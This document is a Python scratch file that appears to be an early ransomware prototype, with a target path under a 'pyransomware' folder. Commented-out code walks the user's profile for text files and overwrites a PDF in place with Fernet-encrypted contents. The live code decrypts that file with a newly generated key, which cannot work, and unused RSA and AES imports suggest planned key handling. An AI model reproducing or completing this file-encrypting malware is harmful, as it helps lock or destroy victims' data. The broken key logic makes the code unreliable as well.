import os 



# print(os.getlogin())
# user_enviroment = os.environ
# print(os.environ['USERPROFILE'])
# os.chdir(os.environ['USERPROFILE'])
# print(os.getcwd())
# userdir = os.environ['USERPROFILE']
# asd = os.path.expanduser('jerry')

localpath = os.environ['USERPROFILE']
print(localpath)

# for root, dirs, files in os.walk(localpath):
#     for file in files:
#         ext = os.path.splitext(file)[-1].lower()
#         if ext == '.txt':
#             print(root, dirs, files)

# testpath = 'c:\\user\\jerry'
# print(str(testpath)+'.aes')
# output = os.path.join(testpath, '.aes')
# print(output)
# for item in os.listdir(os.environ['USERPROFILE']):
    # print(item)
# L = []
# for root, dirs, files in os.walk('C:\\Users\\jerry\\Documents'):
#     L.append((root, dirs, files))

# for i in L:
#     print(i)
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
import pyAesCrypt
import base64

file = 'C:\\Users\\jerry\\Documents\\pyransomware\\target\\documents\\mypdfs\\workstuff.pdf'
key = Fernet.generate_key()
cryptor = Fernet(key)
# with open(file, 'rb') as readf:
#     contents = readf.read()
    
#     print('before: ', contents)

# with open(file, 'wb') as writef:
#     enc_contents = cryptor.encrypt(contents)
#     writef.write(enc_contents)

with open(file, 'rb') as readf:
    contents1 = readf.read()
    

with open(file, 'wb') as writef:
    dec_contents = cryptor.decrypt(contents1)
    writef.write(dec_contents)



